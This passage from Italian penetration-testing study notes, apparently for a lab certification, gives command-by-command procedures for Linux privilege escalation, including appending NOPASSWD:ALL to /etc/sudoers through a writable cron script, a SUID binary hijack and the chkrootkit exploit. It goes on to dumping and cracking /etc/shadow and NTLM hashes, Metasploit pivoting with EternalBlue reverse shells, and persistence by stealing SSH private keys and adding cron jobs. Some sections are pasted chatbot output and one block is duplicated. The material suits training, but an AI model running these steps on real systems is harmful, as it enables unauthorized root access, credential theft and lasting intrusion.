printf '#!/bin/bash\necho "<USER_SENZA_PRIV> ALL=NOPASSWD:ALL" >> /etc/sudoers' > /<PATH_TO_SCRIPT>/<script>.sh
cat /<PATH_TO_SCRIPT>/<script>.sh                          #Check che il file sia stato sovrascritto
sudo -l                                                    #Guarda utenti che fanno parte dei sudoers
sudo su                                                    #Dovresti poterlo fare
whoami                                                     #Dovresti vedere root
ls                                                         #Prendi flag se sta li
```
{% endtab %}

{% tab title="Guida PentestGPT" %}
```shell
sudo -l
#Cerca qualcosa simile a (root) NOPASSWD: /usr/bin/man
   #OPPURE
#(ALL) NOPASSWD: /usr/local/bin/cleanup.shù

ls -l /<PATH_TO_SCRIPT>/<SCRIPT>.sh
#è lo stesso script usato da cron? è scrivibile? include altri file?

#Cerca lo stesso script nei cron
grep -R "<SCRIPT>".sh /etc/cron/* 2>/dev/null
```

Enumera tutti i cron job

```shell
cat /etc/crontab
#Guarda root e script richiamati
```

Guarda tutte le dir cron

```shell
ls -l /etc/cron.d
cat /etc/cron.d/*

ls -l /etc/cron.hourly/
ls -l /etc/cron.daily/
```

Per ogni script che trovi

```shell
ls -l /<PATH_TO_SCRIPT>/<SCRIPT>.sh            #File scrivibile?
ls -ld /<PATH_TO_SCRIPT>/<SCRIPT>.sh           #Dir scrivibile?

cat /<PATH_TO_SCRIPT>/<SCRIPT>.sh              #Analizza contenuto
grep -E '^[^#].*(bash|sh|python|tar|cp|mv)' /<PATH_TO_SCRIPT>/<SCRIPT>.sh
#Cerca:         cmd senza path assoluti
#               chiamate ad altri script
#               file di config esterni

grep PATH /<PATH_TO_SCRIPT>/<SCRIPT>.sh
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">(root) NOPASSWD: /script</mark>

SUDO privesc

{% hint style="info" %}
Devi sapere la psw dell'user che usi
{% endhint %}

```shellscript
sudo -l                                                         #Comandi che l'user attuale può run
#E.g. trovi quanto sotto
#(root) NOPASSWD: /usr/bin/man
```

In questo caso l'\<USER\_TROVATO> può eseguire il binario /usr/bin/man come root senza psw&#x20;

```shell
sudo man ls                                                     #In questo caso man perchè man può essere eseguito come root
#OPPURE
sudo man vim
#Poichè man è eseguito come root puoi aprire una shell 
!/bin/bash                                                      #Questo possibile in man... per altro dipende
```

Ora dovresti vedere che ora sei root

***

### <mark style="color:$primary;">-rwSr-xr-x</mark>

SUID Binaries Exploit

SUID: Set Owner User ID

Permesso specifico oltre i permessi r-w-x che permette ad un user di eseguire uno script o binario specifico con i permessi dell' owner invece che con quelli dell'user stesso.

{% hint style="warning" %}
Fondamentali:

* Exploit su script/binary owned da root o altri privileged users

&#x20;        E

* Exploit su script/binary che posso eseguire con il mio user
{% endhint %}

```shellscript
whoami                                                    #User con privilegi bassi
groups <USER_TROVATO>
pwd 

ls -al
#Cerca binary onwed by root con S. Esempio sotto 
#-rwSr-xr-x root root file

./<FILE_OWNED_ROOT_CON_S>                                 #Check che funziona
#Se funziona, leggi la lista delle stringhe presenti nel binario 

strings <FILE_OWNED_ROOT_CON_S>
#Cerca se si fa riferimento ad un altro file
#Se puoi modificare quel file sostituiscilo con una bash

rm <FILE_REFERRED>
cp /bin/bash <FILE_REFERRED_APPENA_REMOVED>               #Nello stesso posto del <FILE_REFERRED> originale

chmod +s <FILE_REFERRED>
./<FILE_OWNED_ROOT_CON_S>                                 #Potrebbe aver eseguito il file creato con la bash
```

Se è apparsa una bash, controlla se sei root

```shellscript
whoami                                                    #Se esce root sei root
```

***

### Docker container

Potresti trovarti dentro un container docker

```shell
cat /etc/resolv.conf
#Se leggendo il file ti esce un file di config Docker potresti trovarti in un container

#Verifica se stai in un container
cat /proc/1/cgroup | grep -i docker         #CAPISCI COSA FA IL COMANDO


TODO!!!
```



***

### <mark style="color:$primary;">Chkrootkit v<=0.5</mark>

{% hint style="warning" %}
chkrootkit v<=0.50 è vulnerabile ed esegue qualsiasi file.exe che si chiama /tmp/update come root.              (solo Linux)  &#x20;
{% endhint %}

{% code title="shell" %}
```shell
#PRIMA DI FARE TUTTO SPERA CHE CI SIA CHKROOTKIT
chkrootkit -V                                    #Version prima di 0.5 è vuln
#SE CI STA USA MSF


#Fai exploit della victim
sessions -u <NUMBER>                             #Meterpreter session upgrade

whoami                                           #User ma non root
ps aux                                           #Cerca processo lanciato da root, 
                                                 #magari qualcosa con "/bin/bash /<FILE>"
#Leggi il file
cat </FILE>
#Se c'è rootkit
chkrootkit -V                                    #Version prima di 0.5 è vuln
CTRL+C y
```
{% endcode %}

{% code title="Meterpreter session" %}
```shell
use exploit/unix/local/chkrootkit
    set CHKROOTKIT /bin/chkrootkit
    set SESSION <NUMBER>                         #Vai a Meterpreter session NUMBER.
                                                 #Se hai fatto login con ssh fallo con ssh_login
    set LHOST <IP_KALI>
    run
#Controlla che "Started reverse TCP double handler on <IP>:<PORT>" 
#abbia l'IP che avevi settato. Se non lo ha stoppa, risetta e ri-run.

#Aspetta qualche secondo
/bin/bash -i
whoami                                           #Se root, privesc fatta
```
{% endcode %}

***

### <mark style="color:$primary;">Kernel Exploit</mark>

{% hint style="warning" %}
IMPORTANTE: Kernel version e distribution release
{% endhint %}

Il kernel è un programma che è il cuore del OS e ha pieno controllo di ogni risorsa e hardware nel sistema. Funziona come un layer di traduzione fra HW e SW.

1 Trova vulnerabiltà kernel

2 Download, compila e trasferisci l'exploit del kernel nel sistema target

```shellscript
getuid 
shell
    systeminfo                                         #leggi le info del OS
    cat /etc/passwd                                    #Enum tutti gli users
#Ora che sai che funziona la shell esci CTRL+C y
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
cd /tmp
upload ~/Desktop/<PATH_TO_>/les.sh
shell
    /bin/bash -i                                        #Per avere una sessione bash
    chmod +x les.sh                                     #Cambia permessi di esecuzione
    ls -alps                                            #Check permessi di les.sh perchè devi poterla eseguire
    ./les.sh                                            #Trova una lista di vuln del kernel
```

Cerca su `exploit-db` gli exploit alle vuln che hai trovato

Leggi le istruzioni per usare l'exploit

Fai il download

```shellscript
cd Downloads
ls                                                       #Cerca l'exploit che hai scaricato prima                
```

Torna su msf

{% code title="Shell msf di prima" %}
```shellscript
CTRL+C y
#meterpreter
upload ~/Download/<NEW_NOME>
shell
    /bin/bash -i                                          #Per avere una sessione bash
    mv <NUMBER_VECCHIO>.c <NEW_NOME>.c
    sudo apt-get install gcc
    #Se non ci sono istruzioni su come compilare cerca
    #Compilalo con il nome richiesto dalle istruzioni, se necessario rinomina come richiesto
    gcc -pthread <NEW_NOME>.c -o <NEW_NOME> lcrypt
    ls                                                    #Check che ci sta NEW_NOME
    chmod +x <NEW_NOME>
    ./<NEW_NOME> <password123>                            #Potresti avere diversi attributi per eseguire (guarda exploit-db)
    #Aspetta qualche sec
    cat /etc/passwd
    su <USER_PWNED>                                       #in questo caso usa SSH
```
{% endcode %}

Da Kali

```shellscript
ssh <USER_PWNED>@<IP>
#Forse devi togliere ssh-keygen..."IP" e rieseguire
apt-get update
whoami
cat /etc/shadow                                            #Dovresti vedere la psw per root MA non per questo sei root
```

***

## <mark style="color:$primary;">6 - Dump & Crack hash</mark>

{% hint style="info" %}
Linux usa MD5,SHA per enc le psw.

Windows usa NTLM e LM
{% endhint %}

<table><thead><tr><th width="163">Prefix hash</th><th width="208">Algoritmo usato</th><th width="370.0001220703125">Difficoltà per crack</th></tr></thead><tbody><tr><td>$1</td><td>MD5</td><td>Easy</td></tr><tr><td>$2</td><td>Blowfish</td><td>Easy</td></tr><tr><td>$5</td><td>SHA-256</td><td>Hard</td></tr><tr><td>$6</td><td>SHA-512</td><td>Hard</td></tr></tbody></table>

***

### <mark style="color:$primary;">Dump psw in etc/shadow</mark>

* Tutte le INFO degli account sono nel file `/etc/passwd`                                                         (read tutti) &#x20;
* Tutte le PSW degli account sono nel file `/etc/shadow`                                                 (read solo root)&#x20;

Dopo aver ottenuto l'accesso a victim e fatto privesc.

{% tabs %}
{% tab title="msf (BEST)" %}
{% code title="msf" %}
```shell
session -u <NUMBER>                            #Rifai l'upgrade
use post/linux/gather/hashdump                                    
    set session <NUMBER>
    run
loot
cat <FILE/CON/PASSWD.TXT>
cat <FILE/CON/SHADOW.TXT>                                    #e.g. /root/.msf4/loot/20252212_deafult_IP_linux.hashes_006024.txt
CTRL+C y
```
{% endcode %}
{% endtab %}

{% tab title="hashdump (BEST)" %}
{% code title="Meterpreter session" %}
```shell
#Fai exploit della victim
#Fai privesc della victim (devi essere root)
hashdump                                    
#Se non funziona usa modulo msf
CTRL+C y
exit                              #Esci dall'upgrade della shell
```
{% endcode %}
{% endtab %}

{% tab title="cat /file" %}
```shellscript
cat /etc/passwd
cat /etc/shadow

#Troverai qualcosa come 
#$5$...
```
{% endtab %}
{% endtabs %}

***

### <mark style="color:$primary;">Crack degli hashPsw</mark>

{% tabs %}
{% tab title="JohnTheRipper" %}
Copia NTLM hashed dell'ADMIN.&#x20;

{% code title="msf - kali" %}
```shellscript
cd Desktop 
vim hashes.txt
     #Copia gli hash copiati direttamente come letti da hashdump  
     #e.g. 
     #Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
     #bob:1009:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
```
{% endcode %}

JohnTheRipper

```shellscript
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules=All 
```

Per --format:

<table><thead><tr><th width="339">--format</th><th></th></tr></thead><tbody><tr><td>--format=NT</td><td>NTLM</td></tr><tr><td>--format=raw-md5</td><td>MD5</td></tr><tr><td>--format=raw-sha1</td><td>SHA1</td></tr></tbody></table>
{% endtab %}

{% tab title="hashCat" %}
Copia NTLM hashed dell'ADMIN.&#x20;

{% code title="msf - kali" %}
```shellscript
cd Desktop 
vim hashes.txt
     #Copia gli hash copiati   
     :wq  
```
{% endcode %}

HashCat

```shell
gzip -d /usr/share/wordlists/rockyou.txt.gz
hashcat -a3 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

Per il -m NUMBER guarda qui. [https://hashcat.net/wiki/doku.php?id=example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
{% endtab %}

{% tab title="base64" %}
```shellscript
echo "<PSW_HASHED>" > password.txt
base64 -d password.txt 
```
{% endtab %}
{% endtabs %}

***

## <mark style="color:$primary;">7 - Pivoting (2 MODI??)</mark>

{% tabs %}
{% tab title="Modo 1 (BEST)" %}
Usa la macchina compromessa per compromettere altre macchine nella sua internal network.

Ottieni accesso a victim1.

{% code title="Meterpreter session" %}
```shell
#Exploit victim1

ipconfig                                                    #Leggendo la config di rete scopri la rete interna
#Leggi l'IP e la barra dell'interfaccia che serve
run autoroute -s <SUBNET_IP.0>/<barra>                      #Aggiungi un routing a quella rete (e.g. 192.168.1.0/24) 
run autoroute -p                                            #Check la route
background                                                    
```
{% endcode %}

Leggi che sessione hai creato e rinominala per non impazzire

{% code title="msf - me" %}
```shell
sessions
#Dopo che l'hai individuata leggi il NUMBER e rinominala
sessions -n victim1 -i <NUMBER>
#Check che l'hai rinominata
sessions <ID_DI_VICTIM1>
#Da dentro kali lancia lo scan per scoprire le port di victim2
use auxiliary/scanner/portscan/tcp                        
    set RHOSTS <IP_VICTIM1>
    set PORTS 139,445,3389,80,443,8080
    run
#Potrebbe volerci un pò per lo scan       
```
{% endcode %}

Tramite porta locale fai forwarding su porta di victim-2.

{% code title="Meterpreter session" %}
```shell
portfwd add -l 4321 -p <PORTA_TROVATA> -r <IP_VICTIM2>         #e.g. 445, 3389 o web
CTRL+Z y
```
{% endcode %}

Fai lo scan della porta locale kali (porta 4321) perchè così fai lo scan sulla porta target di victim-2

{% code title="msf" %}
```shell
nmap -A -p 4321 localhost
#OPPURE
db_nmap -sS -sV -p 4321 localhost
```
{% endcode %}

Se trovi una vuln dal tuo kali fai l'exploit

```shellscript
use <MODULE/MSF/PER/EXPLOIT/VULN/TROVATA>
    set payload windows/meterpreter/bind_tcp
    set RHOSTS <IP_VICTIM2> #FORSE DEVI USARE 127.0.0.1
    run
```

Ora dovresti avere la meterpreter session.

Per non confonderti rinominala

```shell
sysinfo
getuid
background
sessions        
#Trova la sessione creata ora e rinominala
sessions -n victim2 -i <NUMBER>
#Fai check che hai rinominato
sessions
```
{% endtab %}

{% tab title="Modo 2 (strano)" %}
AUTOROUTE METHOD

{% hint style="warning" %}
Tu → Proxy SOCKS locale → Metasploit → macchina compromessa → destinazione interna
{% endhint %}

Dopo aver fatto l'exploit di una macchina hai solo accesso alla macchina compromessa, non alla rete interna che sta dietro di lei.&#x20;

Spesso però la macchina compromessa è dentro una rete privata (es. 192.168.x.x) che tu **NON** puoi vedere o scansionare direttamente.

Autoroute ti permette di usare la macchina compromessa per entrare nella rete interna.

{% code title="meterpreter" %}
```shell
ipconfig                                                       #Leggendo la config di rete scopri la rete interna
run autoroute -s <IP>/<barra>                                  #Aggiungi un routing a quella rete (e.g. 192.168.1.0/24) 
```
{% endcode %}

Leggi le config del proxy sulla tua macchina

{% code title="me" %}
```shell
cat /etc/proxychains 
#OPPURE 
cat /etc/proxychains.conf 
#OPPURE 
cat /etc/proxychains4.conf
#In basso troverai SOCKS IP:PORT e la porta di solito è PORT=9050
```
{% endcode %}

{% code title="msf" %}
```shell
search socks
use auxiliary/server/socks_proxy                               #Crea un server SOCKS4/4a che usa le route aggiunte
    set VERSION 4a
    set SRVPORT <PORT_TROVATA>                                 #Forse 9050
    run
```
{% endcode %}

{% code title="me" %}
```shell
proxychains nmap <IP> -sT -Pn -sV -p <PORT>                    #PORTA di SMB in questo caso (445)
#Strict chain.... 127.0.0.1:9050 IPtargetReteInterna:445 ... OK
```
{% endcode %}

{% code title="msf" %}
```shell
sessions
sessions <NUMBER>
```
{% endcode %}

{% code title="meterpreter" %}
```shellscript
shell 
    net view <IP_TARGET_ROUTE>
    #Se non hai i permesi prova a migrare su un altro processo
migrate -N explorer.exe                                        #O UN ALTRO PROCESSO
shell 
    net view <IP_TARGET_ROUTE>                                 #Dovresti vedere le shared resources
    net use D: \\<IP_TARGET_ROUTE>\<SHARE_TROVATO>
    net use K: \\<IP_TARGET_ROUTE>\<SHARE_TROVATO>$
    dir D:                                                     #Cerca la flag
    dir <SHARE>:                                               #Cerca la flag  
```
{% endcode %}
{% endtab %}

{% tab title="Modo 3 (Deepseek) " %}
#### **Step 1: Comprometti victim1 e configura routing**

```bash
# Dopo meterpreter su victim1
run autoroute -s 192.168.1.0/24
run autoroute -p
background
sessions -n victim1 -i 1
```

#### **Step 2: Scopri victim2 nella rete interna**

```bash
# Opzione A - Scan da Metasploit attraverso route
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.50  # IP specifico di victim2 se conosciuto
set PORTS 139,445,3389
set THREADS 10
run

# Opzione B - Port forwarding per test specifico
session -i victim1
portfwd add -l 9445 -p 445 -r 192.168.1.50
background
```

#### **Step 3: Test servizio attraverso tunnel**

```bash
# Test SMB su porta tunnel 9445
nmap -sS -sV --script=smb-os-discovery -p 9445 127.0.0.1
```

#### **Step 4: Exploit attraverso tunnel**

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 127.0.0.1    # IMPORTANTE: localhost!
set RPORT 9445          # Porta tunnel, NON 445!
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.0.100  # IP di Kali nella rete
set LPORT 4444
exploit
```

#### **Step 5: Gestisci nuova sessione**

```bash
# Se exploit ha successo
sysinfo
getuid
background
sessions
sessions -n victim2 -i 2
```

### **Diagramma del flusso corretto:**

```
Kali (exploit) → localhost:4321 → [TUNNEL] → victim1 → victim2:445
                  ↑                  ↑         ↑          ↑
                RHOSTS            portfwd    pivot     servizio
               127.0.0.1                     host       reale
```

**Vuoi che ti mostri la procedura esatta per il tuo scenario specifico?** Dimmi:

1. IP di victim1
2. Subnet interna trovata
3. IP di victim2 (se già conosciuto)
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Modo 1 (BEST)" %}
Usa la macchina compromessa per compromettere altre macchine nella sua internal network.

Ottieni accesso a victim1.

{% code title="Meterpreter session" %}
```shell
#Exploit victim1

ipconfig                                                    #Leggendo la config di rete scopri la rete interna
#Leggi l'IP e la barra dell'interfaccia che serve
run autoroute -s <SUBNET_IP.0>/<barra>                      #Aggiungi un routing a quella rete (e.g. 192.168.1.0/24) 
run autoroute -p                                            #Check
background                                                    
```
{% endcode %}

Leggi che sessione hai creato e rinominala per non impazzire

{% code title="msf - me" %}
```shell
sessions
#Dopo che l'hai individuata leggi il NUMBER e rinominala
sessions -n victim1 -i <NUMBER>
#Check che l'hai rinominata
sessions
use auxiliary/scanner/portscan/tcp                        
    set RHOSTS <IP_VICTIM2>
    set PORTS <PORT-RANGE>
    run
#Potrebbe volerci un pò per lo scan
session <NUMBER_SESSION_victim1>    
```
{% endcode %}

Tramite porta locale fai forwarding su porta di victim-2.

{% code title="Meterpreter session" %}
```shell
portfwd add -l 4321 -p <PORTA_WEB_CHE_HAI_TROVATO> -r <IP_VICTIM2>         #e.g. 80
CTRL+Z y
```
{% endcode %}

Fai lo scan della porta locale kali (porta 4321) perchè così fai lo scan sulla porta target di victim-2

{% code title="msf" %}
```shell
nmap -A -p <PORTA_WEB_CHE_HAI_TROVATO> localhost
#OPPURE
db_nmap -sS -sV -p 4321 localhost
```
{% endcode %}

Se trovi una vuln dal tuo kali fai l'exploit

```shellscript
use <MODULE/MSF/PER/EXPLOIT/VULN/TROVATA>
    set payload windows/meterpreter/bind_tcp
    set RHOSTS <IP_VICTIM2>
    run
```

Ora dovresti avere la meterpreter session.

Per non confonderti rinominala

```shell
sysinfo
getuid
background
sessions        
#Trova la sessione creata ora e rinominala
sessions -n victim2 -i <NUMBER>
#Fai check che hai rinominato
sessions
```
{% endtab %}

{% tab title="Modo 2 (strano)" %}
AUTOROUTE METHOD

{% hint style="warning" %}
Tu → Proxy SOCKS locale → Metasploit → macchina compromessa → destinazione interna
{% endhint %}

Dopo aver fatto l'exploit di una macchina hai solo accesso alla macchina compromessa, non alla rete interna che sta dietro di lei.&#x20;

Spesso però la macchina compromessa è dentro una rete privata (es. 192.168.x.x) che tu **NON** puoi vedere o scansionare direttamente.

Autoroute ti permette di usare la macchina compromessa per entrare nella rete interna.

{% code title="meterpreter" %}
```shell
ipconfig                                                       #Leggendo la config di rete scopri la rete interna
run autoroute -s <IP>/<barra>                                  #Aggiungi un routing a quella rete (e.g. 192.168.1.0/24) 
```
{% endcode %}

Leggi le config del proxy sulla tua macchina

{% code title="me" %}
```shell
cat /etc/proxychains 
#OPPURE 
cat /etc/proxychains.conf 
#OPPURE 
cat /etc/proxychains4.conf
#In basso troverai SOCKS IP:PORT e la porta di solito è PORT=9050
```
{% endcode %}

{% code title="msf" %}
```shell
search socks
use auxiliary/server/socks_proxy                               #Crea un server SOCKS4/4a che usa le route aggiunte
    set VERSION 4a
    set SRVPORT <PORT_TROVATA>                                 #Forse 9050
    run
```
{% endcode %}

{% code title="me" %}
```shell
proxychains nmap <IP> -sT -Pn -sV -p <PORT>                    #PORTA di SMB in questo caso (445)
#Strict chain.... 127.0.0.1:9050 IPtargetReteInterna:445 ... OK
```
{% endcode %}

{% code title="msf" %}
```shell
sessions
sessions <NUMBER>
```
{% endcode %}

{% code title="meterpreter" %}
```shellscript
shell 
    net view <IP_TARGET_ROUTE>
    #Se non hai i permesi prova a migrare su un altro processo
migrate -N explorer.exe                                        #O UN ALTRO PROCESSO
shell 
    net view <IP_TARGET_ROUTE>                                 #Dovresti vedere le shared resources
    net use D: \\<IP_TARGET_ROUTE>\<SHARE_TROVATO>
    net use K: \\<IP_TARGET_ROUTE>\<SHARE_TROVATO>$
    dir D:                                                     #Cerca la flag
    dir <SHARE>:                                               #Cerca la flag  
```
{% endcode %}
{% endtab %}
{% endtabs %}

***

***

## <mark style="color:$primary;">8 - Persistence</mark>

### <mark style="color:$primary;">SSH key</mark>

{% code title="KALI" %}
```shell
#Se hai user@psw di SSH continua

#Copiati su KALI la chiave SSH dell'user che hai
scp <USER_USATO>@<IP>:~/.ssh/id_rsa .
#Metti la psw

chmod 400 id_rsa                    #Senza permessi ristretti SSH si rifiuta di usarla
ssh -i id_rsa <user>@<IP>
```
{% endcode %}

***

### <mark style="color:$primary;">HTTP crontab</mark>

{% tabs %}
{% tab title="INE lab" %}
```shell
ps -eaf
echo "* * * * * cd /home/<USER_TROVATO> && python -m SimpleHTTPServer" > cron
crontab -i cron
crontab -l
```
{% endtab %}

{% tab title="deepseek" %}
{% code title="VICTIM" %}
```shell
crontab -e 

#Aggiungi al file questa linea
*/1 * * * * cd /home/<USER_TROVATO> && python3 -m http.server 8080

#Fai check che ci sia il job schedulato
crontab -l
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% code title="KALI" %}
```shell
APRI IL BROWSER A 192.80.25.3:8080

#oppure

curl http://192.80.25.3:8080/
curl http://192.80.25.3:8080/flag.txt
```
{% endcode %}









